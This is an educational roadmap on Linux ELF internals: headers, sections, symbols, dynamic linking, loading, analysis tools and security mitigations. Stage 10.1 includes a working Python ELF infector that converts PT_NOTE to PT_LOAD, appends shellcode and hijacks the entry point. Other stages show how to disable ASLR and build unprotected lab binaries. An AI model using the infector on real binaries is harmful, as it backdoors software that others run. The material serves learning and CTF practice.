# ELF Zero to Hero Roadmap
> Executable and Linkable Format — Complete Learning Path

---

## Stage 0 — Prerequisites

Before touching ELF, be comfortable with:

| Topic | What you need |
|-------|--------------|
| C language | pointers, structs, memory layout |
| Linux CLI | bash, file permissions, process model |
| Assembly basics | x86-64 registers, calling convention, stack frames |
| Hex/Binary | reading hexdump output, bit manipulation |
| GCC toolchain | compile → assemble → link → load pipeline |

**Quick check — can you answer these?**
- What happens when you type `./a.out` in a shell?
- What is the difference between compile-time and run-time?
- What does the stack look like just after a function call?

---

## Stage 1 — What is ELF?

### 1.1 ELF File Types

```
ET_NONE   0   Unknown
ET_REL    1   Relocatable object (.o files — not executable yet)
ET_EXEC   2   Executable (fixed load address, classic binary)
ET_DYN    3   Shared object / PIE executable (.so and modern binaries)
ET_CORE   4   Core dump (crash snapshot)
```

```bash
# See the type of any binary
file /bin/ls
file /lib/x86_64-linux-gnu/libc.so.6
file /tmp/core

# Read the ELF type directly
readelf -h /bin/ls | grep Type
```

### 1.2 ELF vs Other Formats

| Format | OS | Notes |
|--------|----|-------|
| ELF | Linux, BSD, Android | Modern standard |
| PE/COFF | Windows | .exe, .dll |
| Mach-O | macOS, iOS | fat binaries |
| a.out | Legacy Unix | predecessor to ELF |

### 1.3 Create Your First ELF

```c
// hello.c
#include <stdio.h>
int main() { puts("Hello ELF"); return 0; }
```

```bash
gcc -o hello hello.c          # compile + link
gcc -c hello.c -o hello.o     # compile only → ET_REL
file hello hello.o
```

---

## Stage 2 — ELF Header

Every ELF file starts with a 64-byte header (64-bit) or 52-byte (32-bit).

```bash
readelf -h /bin/ls
```

### 2.1 Header Fields (64-bit)

```
Offset  Size  Field            Meaning
------  ----  -----            -------
0x00    4     e_ident[0-3]     Magic: 7f 45 4c 46 (\x7fELF)
0x04    1     e_ident[4]       Class: 1=32-bit, 2=64-bit
0x05    1     e_ident[5]       Endian: 1=LE, 2=BE
0x06    1     e_ident[6]       ELF version (always 1)
0x07    1     e_ident[7]       OS/ABI (0=SysV, 3=Linux, 6=Solaris)
0x10    2     e_type           File type (ET_EXEC, ET_DYN, ...)
0x12    2     e_machine        ISA: 0x3E=x86-64, 0x28=ARM, 0xB7=AArch64
0x14    4     e_version        ELF version
0x18    8     e_entry          Entry point virtual address
0x20    8     e_phoff          Program header table offset
0x28    8     e_shoff          Section header table offset
0x30    4     e_flags          Architecture-specific flags
0x34    2     e_ehsize         ELF header size (64 bytes for 64-bit)
0x36    2     e_phentsize      Size of one program header entry
0x38    2     e_phnum          Number of program headers
0x3A    2     e_shentsize      Size of one section header entry
0x3C    2     e_shnum          Number of section headers
0x3E    2     e_shstrndx       Index of section name string table
```

### 2.2 Magic Bytes — Manual Check

```bash
xxd /bin/ls | head -4
# 7f 45 4c 46 = \x7fELF
# Byte 5: 02 = 64-bit
# Byte 6: 01 = little-endian
```

### 2.3 Craft a Minimal ELF (Assembly)

```nasm
; tiny.asm — 64-bit ELF that exits with code 42
; Smallest valid ELF: ~120 bytes
BITS 64
org 0x400000

; ELF header
db 0x7f,'E','L','F',2,1,1,0, 0,0,0,0,0,0,0,0
dw 2, 0x3e
dd 1
dq _start       ; entry
dq phdr-$$      ; phoff
dq 0            ; shoff
dd 0,0x38,1     ; flags, ehsize, phentsize
dw 1,0,0,0      ; phnum, shentsize, shnum, shstrndx

phdr:
dd 1,5          ; PT_LOAD, PF_R|PF_X
dq 0,$$,$$      ; offset, vaddr, paddr
dq filesz,filesz,0x200000,0x200000

_start:
  xor edi, edi
  mov eax, 60   ; sys_exit
  mov edi, 42
  syscall

filesz equ $ - $$
```

```bash
nasm -f bin tiny.asm -o tiny
chmod +x tiny
./tiny; echo $?  # → 42
wc -c tiny       # tiny ELF!
```

---

## Stage 3 — Sections vs Segments

This is the most commonly confused concept in ELF.

```
SECTIONS  → used at compile/link time  (what is where in the file)
SEGMENTS  → used at load/run time      (what gets mapped into memory)
```

### 3.1 Key Sections

```
.text        Executable machine code
.data        Initialized global/static data (read-write)
.rodata      Read-only data (strings, constants)
.bss         Uninitialized data (zero-filled by OS, no file space)
.plt         Procedure Linkage Table (stubs for external functions)
.got         Global Offset Table (resolved addresses)
.got.plt     GOT entries for PLT
.symtab      Full symbol table (stripped in release binaries)
.dynsym      Dynamic symbol table (needed for runtime linking)
.strtab      String table for .symtab
.dynstr      String table for .dynsym
.dynamic     Dynamic linking metadata
.rel.text    Relocations for .text (Rel format)
.rela.text   Relocations for .text (Rela format — has addend)
.eh_frame    Exception/unwind info (used by GCC, debuggers)
.init        Code run before main()
.fini        Code run after main()
.interp      Path to dynamic linker (/lib64/ld-linux-x86-64.so.2)
.note.*      Build ID, GNU stack info, etc.
.debug_*     DWARF debug info (stripped in release)
```

```bash
# List all sections
readelf -S /bin/ls

# Hexdump specific section
objdump -s -j .rodata /bin/ls | head -30

# Disassemble .text
objdump -d /bin/ls | head -50

# Show section sizes
size /bin/ls
```

### 3.2 Key Segments (Program Headers)

```
PT_LOAD      Loadable segment (maps to memory pages)
PT_DYNAMIC   Dynamic linking information
PT_INTERP    Path of dynamic linker
PT_NOTE      Auxiliary info (build-id, etc.)
PT_GNU_STACK Stack permissions (NX control)
PT_GNU_RELRO Read-only after relocation (RELRO)
PT_PHDR      Location of program header table itself
PT_TLS       Thread-local storage template
```

```bash
# List all program headers / segments
readelf -l /bin/ls

# Show segment→section mapping
readelf -l /bin/ls | grep -A 40 "Section to Segment"
```

### 3.3 Sections vs Segments Mapping

```
One segment can contain multiple sections.
A section can be in zero or one segment.

Typical LOAD segments:
  LOAD [R-X]  → contains: .text .plt .init .fini  (code)
  LOAD [RW-]  → contains: .data .bss .got .dynamic (data)
```

---

## Stage 4 — Symbols

### 4.1 Symbol Types

```
STT_NOTYPE     No type (external refs before resolution)
STT_OBJECT     Data variable
STT_FUNC       Function
STT_SECTION    Section itself
STT_FILE       Source filename
STT_COMMON     Common block (uninitialized global)
STT_TLS        Thread-local variable
```

### 4.2 Symbol Binding

```
STB_LOCAL    Visible only within object file (static functions/vars)
STB_GLOBAL   Visible across all objects (normal functions/vars)
STB_WEAK     Like global but overridable (e.g., weak aliases)
```

### 4.3 Symbol Commands

```bash
# List all symbols (needs .symtab — stripped binaries won't have this)
nm /bin/ls

# Dynamic symbols only (always present if shared library)
nm -D /bin/ls
readelf -s /bin/ls

# Symbol types legend for nm output:
# T = .text (function)    t = local .text
# D = .data               d = local .data
# B = .bss                b = local .bss
# R = .rodata             r = local .rodata
# U = Undefined (extern)

# Show mangled C++ symbols demangled
nm -C ./program

# Check if binary is stripped
file ./program
nm ./program 2>&1 | grep -c "no symbols"
```

### 4.4 String Tables

```bash
# Dump all strings from binary
strings /bin/ls

# Strings from a specific section
readelf -p .rodata /bin/ls

# Show imported library strings
strings /bin/ls | grep "lib"
```

---

## Stage 5 — Relocations

Relocations tell the linker/loader "patch this address at this location."

### 5.1 Relocation Structure

```c
// Rel (no addend)
typedef struct {
    Elf64_Addr r_offset;  // offset in section to patch
    Elf64_Xword r_info;   // symbol index + relocation type
} Elf64_Rel;

// Rela (with addend — used by x86-64)
typedef struct {
    Elf64_Addr   r_offset;
    Elf64_Xword  r_info;
    Elf64_Sxword r_addend;  // constant addend for calculation
} Elf64_Rela;
```

### 5.2 Common Relocation Types (x86-64)

```
R_X86_64_NONE       0   No relocation
R_X86_64_64         1   Direct 64-bit: S + A
R_X86_64_PC32       2   PC-relative 32-bit: S + A - P
R_X86_64_GOT32      3   GOT entry 32-bit
R_X86_64_PLT32      4   PLT entry 32-bit: L + A - P
R_X86_64_COPY       5   Copy symbol at runtime (for executables using shared lib data)
R_X86_64_GLOB_DAT   6   Set GOT entry to symbol address
R_X86_64_JUMP_SLOT  7   Set PLT GOT entry (lazy resolution)
R_X86_64_RELATIVE   8   Adjust by load base: B + A (PIE/ASLR)
R_X86_64_32         10  Direct 32-bit zero-extended
R_X86_64_32S        11  Direct 32-bit sign-extended
R_X86_64_TPOFF32    23  Thread-local storage
```

```bash
# View relocations
readelf -r /bin/ls

# View only PLT-related relocations (lazy binding stubs)
readelf -r /bin/ls | grep JUMP_SLOT
```

---

## Stage 6 — Dynamic Linking (PLT/GOT)

This is the heart of how shared libraries work. Master this and you understand GOT overwrite exploits.

### 6.1 The Full Picture

```
Source code calls: printf("hello\n")

Compiler emits:  call printf@PLT

At runtime:
1. CPU jumps to PLT stub (in .plt section)
2. PLT stub does: jmp [GOT entry for printf]
3. First call: GOT entry → back to PLT resolver
4. PLT resolver calls ld.so to find printf in libc
5. ld.so writes printf's real address into GOT entry
6. Second call: GOT entry → directly to printf
```

### 6.2 PLT Stub Layout

```asm
; PLT stub for printf (lazy binding)
printf@plt:
  jmp    QWORD PTR [rip + printf@got.plt]  ; jump through GOT
  push   0x3                                ; index into reloc table
  jmp    plt[0]                             ; jump to resolver

; PLT[0] (resolver entry)
plt_resolver:
  push   QWORD PTR [rip + link_map]        ; push link_map for ld.so
  jmp    QWORD PTR [rip + _dl_runtime_resolve]  ; call ld.so resolver
```

```bash
# Disassemble PLT stubs
objdump -d /bin/ls | grep -A 5 "<printf@plt>"

# See GOT entries (before and after resolution)
readelf -r /bin/ls | grep JUMP
objdump -R /bin/ls        # dynamic relocations

# Watch GOT get filled at runtime (requires pwndbg/peda in gdb)
gdb /bin/ls
b *main
r
info got
```

### 6.3 The .dynamic Section

```bash
readelf -d /bin/ls

# Key .dynamic tags:
# DT_NEEDED     → shared library dependency (like ldd output)
# DT_RPATH      → hardcoded library search path
# DT_RUNPATH    → newer version of RPATH
# DT_SYMTAB     → address of .dynsym
# DT_STRTAB     → address of .dynstr
# DT_PLTREL     → type of PLT relocs (RELA or REL)
# DT_JMPREL     → address of PLT relocation table
# DT_INIT       → address of _init function
# DT_FINI       → address of _fini function
# DT_DEBUG      → runtime debug info (points to r_debug struct)
```

### 6.4 LD_* Environment Variables

```bash
# Show which libraries are loaded and from where
ldd /bin/ls

# WARNING: never use ldd on untrusted binaries (it executes the binary!)
# Safe alternative:
readelf -d /bin/ls | grep NEEDED
objdump -p /bin/ls | grep NEEDED

# Debug dynamic linker in detail
LD_DEBUG=all /bin/ls 2>&1 | head -50
LD_DEBUG=libs /bin/ls 2>&1      # only library search
LD_DEBUG=symbols /bin/ls 2>&1   # symbol resolution
LD_DEBUG=reloc /bin/ls 2>&1     # relocation details

# Preload a shared library (intercept functions)
LD_PRELOAD=/path/to/myhook.so /bin/ls

# Override library search path
LD_LIBRARY_PATH=/opt/mylibs /bin/ls
```

### 6.5 Build & Use a Shared Library

```c
// mylib.c
#include <stdio.h>
void greet() { printf("Hello from shared lib!\n"); }
```

```bash
gcc -shared -fPIC -o libmy.so mylib.c
readelf -d libmy.so | head -20
readelf -s libmy.so

# Check PIC code (uses RIP-relative addressing)
objdump -d libmy.so | grep "rip"
```

---

## Stage 7 — ELF Loading (Kernel Side)

### 7.1 What Happens When You execve()

```
1. Shell calls execve("/bin/ls", argv, envp)
2. Kernel (fs/binfmt_elf.c) reads first 128 bytes
3. Checks magic bytes: \x7fELF
4. Reads e_type:
   - ET_EXEC → fixed address load
   - ET_DYN  → ASLR load at random base
5. Reads PT_INTERP → finds /lib64/ld-linux-x86-64.so.2
6. mmaps each PT_LOAD segment into process address space
7. Sets up stack: argc, argv[], envp[], auxv[]
8. Jumps to ld.so entry point (not program entry yet!)
9. ld.so: maps all DT_NEEDED libraries
10. ld.so: resolves undefined symbols, applies relocations
11. ld.so: runs .init sections in dependency order
12. ld.so: transfers control to program's e_entry (_start)
13. _start: calls __libc_start_main → calls main()
14. main() returns → __libc_start_main calls exit()
15. exit() runs .fini sections + atexit() handlers
```

### 7.2 Auxiliary Vector (auxv)

The kernel passes extra info to the process via auxv:

```bash
# See auxv for any process
cat /proc/self/auxinfo  # not always available
LD_SHOW_AUXV=1 /bin/true

# Key auxv entries:
# AT_PHDR      address of program header table
# AT_PHNUM     number of program headers
# AT_ENTRY     program entry point
# AT_BASE      base address of interpreter (ld.so)
# AT_RANDOM    address of 16 random bytes (stack cookie seed)
# AT_EXECFN    filename of executable
# AT_SYSINFO_EHDR  vDSO base address
```

### 7.3 Process Memory Layout

```
High address (0xFFFF...)
  [kernel space]
  [stack]         → grows down, contains argv, envp, auxv
  [mmap region]   → shared libs, mmap() calls, ld.so
  [heap]          → grows up, malloc/brk
  [.bss]
  [.data]
  [.text / .rodata]
Low address (0x0000...)
```

```bash
# See actual memory layout of a running process
cat /proc/$(pidof ls)/maps
cat /proc/self/maps

# Use pmap
pmap -x $(pidof bash)
```

### 7.4 vDSO and vsyscall

```bash
# vDSO: kernel-mapped ELF loaded into every process
# Provides fast system calls without kernel crossing
# (gettimeofday, clock_gettime, etc.)

# Find it in process maps
cat /proc/self/maps | grep vdso

# Extract and examine vDSO
dd if=/proc/self/mem bs=1 skip=$((16#$(cat /proc/self/maps | grep vdso | cut -d- -f1))) count=4096 2>/dev/null | file -
```

---

## Stage 8 — Tools Mastery

### 8.1 Core Tools

```bash
# === readelf — ELF-specific, most detailed ===
readelf -h binary        # ELF header
readelf -l binary        # program headers (segments)
readelf -S binary        # section headers
readelf -s binary        # symbol tables
readelf -d binary        # .dynamic section
readelf -r binary        # relocations
readelf -x .rodata bin   # hex dump of section
readelf -p .rodata bin   # string dump of section
readelf -a binary        # all of the above

# === objdump — disassembly + binary info ===
objdump -d binary                    # disassemble .text
objdump -D binary                    # disassemble all sections
objdump -t binary                    # symbol table
objdump -R binary                    # dynamic relocations
objdump -p binary                    # private/dynamic headers
objdump -s -j .data binary           # hex dump of .data
objdump -M intel -d binary           # Intel syntax disasm

# === nm — symbol info ===
nm binary                # all symbols
nm -D binary             # dynamic symbols only
nm -C binary             # demangle C++ symbols
nm -u binary             # undefined symbols only
nm -g binary             # external symbols only
nm -n binary             # sort by address

# === strings ===
strings binary           # all printable strings
strings -n 8 binary      # minimum length 8
strings -t x binary      # show file offset (hex)
strings -t d binary      # show file offset (decimal)

# === file + hexdump ===
file binary
hexdump -C binary | head -20
xxd binary | head -20
```

### 8.2 Tracing Tools

```bash
# strace — trace system calls
strace /bin/ls 2>&1 | head -30
strace -e trace=open,read,write /bin/ls 2>&1
strace -f /bin/ls 2>&1   # follow forks

# ltrace — trace library calls
ltrace /bin/ls 2>&1 | head -20

# Combine both
strace -e trace=mmap,mprotect /bin/ls 2>&1  # see memory mapping

# ftrace (kernel)
echo function > /sys/kernel/debug/tracing/current_tracer
# (requires root)
```

### 8.3 Python — pyelftools

```bash
pip3 install pyelftools
```

```python
from elftools.elf.elffile import ELFFile

with open('/bin/ls', 'rb') as f:
    elf = ELFFile(f)
    print(f"Arch: {elf.get_machine_arch()}")
    print(f"Entry: {hex(elf['e_entry'])}")
    
    # Iterate sections
    for s in elf.iter_sections():
        print(f"  {s.name:20} @ {hex(s['sh_addr'])}  sz={s['sh_size']}")
    
    # Get .text section
    text = elf.get_section_by_name('.text')
    print(f"\n.text: {text['sh_size']} bytes")
    print(f"  data[:16]: {text.data()[:16].hex()}")
    
    # Dynamic symbols
    dynsym = elf.get_section_by_name('.dynsym')
    if dynsym:
        for sym in dynsym.iter_symbols():
            if sym.name:
                print(f"  {sym.name}: {sym['st_value']:#x}")
```

### 8.4 Python — LIEF (Binary Analysis + Manipulation)

```bash
pip3 install lief
```

```python
import lief

binary = lief.parse('/bin/ls')

# Read info
print(f"Entry: {binary.header.entrypoint:#x}")
print(f"PIE: {binary.is_pie}")
print(f"NX: {binary.has_nx}")

# List libraries
for lib in binary.libraries:
    print(f"  {lib}")

# Enumerate sections
for s in binary.sections:
    print(f"  {s.name:20} {s.virtual_address:#x} size={s.size}")

# Modify: add a new section
new_section = lief.ELF.Section(".inject")
new_section.content = [0x90] * 64   # NOP sled
new_section.flags = lief.ELF.SECTION_FLAGS.EXECINSTR | lief.ELF.SECTION_FLAGS.ALLOC
binary.add(new_section)
binary.write('/tmp/ls_modified')

# Modify: patch a byte
section = binary.get_section('.text')
content = list(section.content)
content[0] = 0x90  # NOP first byte
section.content = content
binary.write('/tmp/ls_patched')
```

### 8.5 patchelf — Change Binary Metadata

```bash
# Install
apt install patchelf

# Change the dynamic linker
patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 ./binary

# Add a new shared library dependency
patchelf --add-needed libhook.so ./binary

# Remove a dependency
patchelf --remove-needed libunneeded.so ./binary

# Change RPATH/RUNPATH
patchelf --set-rpath '/opt/custom/lib:$ORIGIN/../lib' ./binary
patchelf --print-rpath ./binary

# Make a binary relocatable
patchelf --set-soname libmy.so.1 ./libmy.so
```

### 8.6 GDB + pwndbg

```bash
pip install pwntools
apt install pwndbg  # or: git clone + setup.sh

gdb /bin/ls
# In pwndbg:
vmmap          # memory layout
got            # GOT entries
plt            # PLT stubs
info got       # raw GOT table
checksec       # security mitigations
heap           # heap info
```

---

## Stage 9 — ELF Security Mitigations

### 9.1 checksec

```bash
# Install
pip install pwntools    # gives checksec via python
apt install checksec    # standalone

checksec --file=/bin/ls
checksec --file=/bin/ls --output=json
```

### 9.2 Mitigations Explained

```
MITIGATION      COMPILER FLAG           WHAT IT DOES
-----------     -------------           ------------
PIE             -fPIE -pie              Position-independent executable.
                                        ET_DYN type. ASLR randomizes base.
                                        Breaks fixed-address exploits.

NX/DEP          -z noexecstack          Stack/heap pages marked non-exec.
                                        PT_GNU_STACK with RW (no X) flag.
                                        Breaks shellcode injection.

Stack Canary    -fstack-protector-all   Random value placed before return addr.
                                        Checked before function returns.
                                        Breaks simple buffer overflows.

RELRO           -z relro                Makes GOT read-only after startup.
  Partial         (default)             .got.plt still writable (PLT stubs)
  Full            -z relro -z now       ALL GOT entries resolved at startup,
                                        entire GOT marked read-only.
                                        Breaks GOT overwrite exploits.

FORTIFY         -D_FORTIFY_SOURCE=2     Replaces strcpy/sprintf with checked
                                        versions (strcpy_chk, etc.)

ASLR            /proc/sys/kernel/       OS-level. Randomizes stack, heap, libs.
                randomize_va_space=2    Works together with PIE.
```

### 9.3 Check ASLR Setting

```bash
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = stack + libs randomized
# 2 = full (stack + libs + heap)

# Disable for testing (requires root)
echo 0 > /proc/sys/kernel/randomize_va_space
```

### 9.4 Compile with All Mitigations

```bash
# Maximum security build:
gcc -o secure prog.c                    \
    -fstack-protector-all               \
    -fPIE -pie                          \
    -D_FORTIFY_SOURCE=2                 \
    -O2                                 \
    -Wl,-z,relro,-z,now                 \
    -Wl,-z,noexecstack

checksec --file=./secure
```

### 9.5 Compile Deliberately Vulnerable (for labs)

```bash
# NO mitigations (CTF practice binary)
gcc -o vuln prog.c                      \
    -no-pie                             \
    -fno-stack-protector                \
    -z execstack                        \
    -Wl,-z,norelro                      \
    -U_FORTIFY_SOURCE

checksec --file=./vuln
```

---

## Stage 10 — ELF Manipulation & Injection

### 10.1 PT_NOTE → PT_LOAD Injection (Classic ELF Infection)

Convert the unused PT_NOTE segment into an executable PT_LOAD segment and inject code there. This is a classic Linux ELF virus technique (Silvio Cesare 1998).

```python
#!/usr/bin/env python3
"""
PT_NOTE to PT_LOAD injection — educational ELF backdoor technique
Author: Manikandan / Hacker Tamizha
"""
import sys, struct, os

def inject_elf(target, shellcode):
    with open(target, 'rb') as f:
        data = bytearray(f.read())

    # Parse ELF header (64-bit LE)
    e_phoff  = struct.unpack_from('<Q', data, 0x20)[0]
    e_phnum  = struct.unpack_from('<H', data, 0x38)[0]
    e_phentsize = struct.unpack_from('<H', data, 0x36)[0]

    PT_NOTE = 4
    PT_LOAD = 1
    PF_R, PF_W, PF_X = 4, 2, 1

    # Find PT_NOTE segment
    note_off = None
    for i in range(e_phnum):
        phdr_off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from('<I', data, phdr_off)[0]
        if p_type == PT_NOTE:
            note_off = phdr_off
            break

    if note_off is None:
        print("No PT_NOTE found!")
        return False

    # Append shellcode at end of file
    inject_offset = len(data)
    data += shellcode

    # New virtual address (beyond typical code segments, page-aligned)
    inject_vaddr = 0xC000000

    # Patch PT_NOTE → PT_LOAD
    struct.pack_into('<I',  data, note_off + 0x00, PT_LOAD)                    # p_type
    struct.pack_into('<I',  data, note_off + 0x04, PF_R | PF_X)                # p_flags
    struct.pack_into('<Q',  data, note_off + 0x08, inject_offset)               # p_offset
    struct.pack_into('<Q',  data, note_off + 0x10, inject_vaddr)                # p_vaddr
    struct.pack_into('<Q',  data, note_off + 0x18, inject_vaddr)                # p_paddr
    struct.pack_into('<Q',  data, note_off + 0x20, len(shellcode))              # p_filesz
    struct.pack_into('<Q',  data, note_off + 0x28, len(shellcode))              # p_memsz
    struct.pack_into('<Q',  data, note_off + 0x30, 0x1000)                      # p_align

    # Redirect entry point to injected code
    original_entry = struct.unpack_from('<Q', data, 0x18)[0]
    struct.pack_into('<Q', data, 0x18, inject_vaddr)

    with open(target + '.infected', 'wb') as f:
        f.write(data)

    print(f"[+] Injected {len(shellcode)} bytes at {inject_vaddr:#x}")
    print(f"[+] Original entry: {original_entry:#x}")
    print(f"[+] New entry:      {inject_vaddr:#x}")
    return True

# Example: pop a shell then jump to original entry
# (Replace with actual shellcode for your architecture)
if __name__ == '__main__':
    nop_sled = bytes([0x90] * 16)  # placeholder shellcode
    inject_elf(sys.argv[1], nop_sled)
```

### 10.2 LD_PRELOAD Hooking

```c
// hook.c — intercept open() system calls
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

typedef int (*orig_open_t)(const char*, int, ...);

int open(const char *pathname, int flags, ...) {
    orig_open_t orig_open = (orig_open_t)dlsym(RTLD_NEXT, "open");
    fprintf(stderr, "[HOOK] open(\"%s\", %d)\n", pathname, flags);
    return orig_open(pathname, flags);
}
```

```bash
gcc -shared -fPIC -o hook.so hook.c -ldl
LD_PRELOAD=./hook.so ls /tmp
```

### 10.3 Symbol Interposition (Weak Symbol Override)

```c
// override.c — override malloc with a custom version
#include <stdlib.h>
#include <stdio.h>

void *malloc(size_t size) {
    fprintf(stderr, "[MALLOC] requested %zu bytes\n", size);
    return NULL;  // or call real malloc via dlsym
}
```

```bash
gcc -shared -fPIC -o override.so override.c
LD_PRELOAD=./override.so /bin/ls   # ls will fail malloc
```

### 10.4 Core Dump Analysis

```bash
# Enable core dumps
ulimit -c unlimited
echo core > /proc/sys/kernel/core_pattern  # simple naming

# Generate a crash
./vuln  # (crash it)

# Analyze core dump
gdb ./vuln core
bt               # backtrace
info registers   # register state at crash
x/20xg $rsp      # stack contents
```

---

## Stage 11 — Advanced Topics

### 11.1 DWARF Debug Info

```bash
# DWARF = Debug With Attributed Record Formats
# Embedded in .debug_* sections (NOT the same as symbols)

readelf --debug-dump=info binary | head -100
readelf --debug-dump=line binary | head -100   # source line info

# Extract DWARF with dwarfdump
apt install dwarfdump
dwarfdump binary

# objdump with source interleaved
objdump -S binary   # needs -g at compile time
```

### 11.2 Strip & Anti-Strip

```bash
# Remove debug symbols (shrink binary, hinder reversing)
strip --strip-all binary
strip --strip-debug binary        # keep dynamic symbols
strip --strip-unneeded binary     # remove only non-dynamic

# Check what's left
nm binary 2>&1
readelf -S binary | grep debug

# Restore symbols from DWARF (limited)
# Use: eu-unstrip, retdec, or binary ninja
```

### 11.3 ELF and BPF

```bash
# BPF/eBPF programs are also ELF files!
# .text contains BPF bytecode
# .maps contains BPF map definitions
# BTF info in .BTF section

# Inspect a BPF ELF
readelf -S /sys/fs/bpf/your_prog
bpftool prog show
bpftool map show
```

### 11.4 Android ELF (ART / NDK)

```bash
# Android .so and executables are ELF
# ABI: armeabi-v7a, arm64-v8a, x86, x86_64

# Use Android NDK toolchain:
aarch64-linux-android-readelf -h libapp.so
aarch64-linux-android-objdump -d libapp.so

# linker64 is Android's equivalent of ld.so
```

### 11.5 Kernel Modules are ELF

```bash
# .ko (kernel object) files are ET_REL ELF files
file /lib/modules/$(uname -r)/kernel/drivers/net/dummy.ko

readelf -S /lib/modules/$(uname -r)/kernel/drivers/net/dummy.ko
# Has .modinfo section with metadata
readelf -p .modinfo /lib/modules/$(uname -r)/kernel/drivers/net/dummy.ko
```

---

## Stage 12 — CTF / Practice Resources

### 12.1 Challenges

```
pwn.college         → structured binary exploitation path
picoCTF             → beginner to intermediate ELF challenges
pwnable.kr          → classic pwn challenges
exploit.education   → phoenix & protostar VMs
ropemporium.com     → ROP chain practice
crackmes.one        → reverse engineering practice
```

### 12.2 Practice Binaries to Reverse

```bash
# Good small binaries to practice on:
/usr/bin/true        # minimal — just exit(0)
/usr/bin/whoami      # simple syscall + string
/usr/bin/id          # slightly more complex
/bin/ls              # full-featured, good for symbols
/usr/bin/ssh         # complex, stripped
```

### 12.3 Capture the Flag ELF Template

```bash
# Typical CTF workflow
checksec --file=./challenge
file ./challenge
strings ./challenge | grep -E "(pass|flag|CTF|key|secret)"
ltrace ./challenge 2>&1 | head -50
strace ./challenge 2>&1 | head -50
readelf -s ./challenge
objdump -d ./challenge | less
gdb ./challenge
```

---

## Quick Reference Cheatsheet

```bash
# HEADER
readelf -h binary

# SECTIONS
readelf -S binary
objdump -s -j .text binary

# SEGMENTS
readelf -l binary

# SYMBOLS
nm -D binary
readelf -s binary

# RELOCATIONS
readelf -r binary

# DISASSEMBLE
objdump -M intel -d binary

# STRINGS
strings -t x binary

# DYNAMIC INFO
readelf -d binary
ldd binary

# TRACE
strace binary
ltrace binary

# SECURITY
checksec --file=binary

# MEMORY MAP
cat /proc/PID/maps

# PATCH
patchelf --set-interpreter /lib64/ld.so.2 binary
```

---

## Learning Order (Week-by-Week)

```
Week 1   → Stage 0, 1, 2   — ELF header, file types, magic bytes
Week 2   → Stage 3         — Sections vs Segments, readelf mastery
Week 3   → Stage 4, 5      — Symbols, relocations
Week 4   → Stage 6         — PLT/GOT, dynamic linking, LD_DEBUG
Week 5   → Stage 7         — Kernel loading, memory layout, vDSO
Week 6   → Stage 8         — Tools: pyelftools, LIEF, patchelf
Week 7   → Stage 9         — Security mitigations, checksec, NX/RELRO/PIE
Week 8   → Stage 10        — ELF injection, LD_PRELOAD hooks
Week 9+  → Stage 11, 12   — DWARF, BPF, CTF practice
```

---

*Roadmap for Hacker Tamizha — Manikandan*
*Security & Linux Internals Series*
